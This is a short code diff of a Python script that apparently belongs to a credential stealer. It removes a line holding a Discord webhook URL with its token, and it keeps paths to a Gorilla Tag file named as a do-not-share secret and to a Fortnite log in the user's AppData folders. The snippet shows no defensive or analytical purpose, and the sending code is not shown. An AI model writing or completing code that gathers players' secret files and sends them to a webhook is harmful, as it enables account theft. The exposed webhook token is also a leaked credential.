@@ -3,7 +3,6 @@ import re
 import requests
 import datetime
 import json
-webhook_url = "https://discord.com/api/webhooks/1329909468653424650/AtSCYLJYHm1DPd-i4__hGhcmHGZwgbvUIJ4EUQsn-vC-j9i8ytD3lPzoeo9BNCoczqJc"
 file_path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'LocalLow', 'Another Axiom', 'Gorilla Tag', 'DoNotShareWithAnyoneEVERNoMatterWhatTheySay.txt')
 app_data_path = os.getenv('APPDATA')
 log_file_path = os.path.join(app_data_path, r"..\Local\FortniteGame\Saved\Logs\FortniteGame.log")
